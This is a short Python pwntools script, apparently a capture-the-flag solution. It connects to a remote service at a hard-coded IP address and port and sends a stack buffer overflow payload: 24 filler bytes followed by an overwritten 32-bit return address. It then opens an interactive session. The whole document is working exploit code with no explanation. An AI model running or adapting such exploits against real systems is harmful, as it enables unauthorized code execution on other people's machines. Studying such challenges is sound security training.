from pwn import *
p = remote("143.198.219.171",5000) 
payload = b"A"*24 + p32(0x80491fc) 
p.sendafter(b"me?",payload) 
p.interactive() 


